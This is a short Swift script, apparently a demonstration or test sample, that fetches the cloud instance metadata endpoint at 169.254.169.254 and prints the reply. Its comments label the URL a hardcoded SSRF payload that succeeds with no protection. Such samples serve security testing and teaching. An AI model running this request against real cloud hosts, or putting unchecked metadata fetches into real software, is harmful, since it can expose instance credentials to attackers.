import Foundation

let maliciousURL = "http://169.254.169.254/latest/meta-data/"  // Hardcoded SSRF payload
guard let url = URL(string: maliciousURL) else { fatalError("Invalid URL") }

let task = URLSession.shared.dataTask(with: url) { data, response, error in
    if let data = data, let responseString = String(data: data, encoding: .utf8) {
        print("SSRF Response: \(responseString)")  // Succeeds, no protection
    }
}
task.resume()
RunLoop.main.run()  // Blocks to complete request
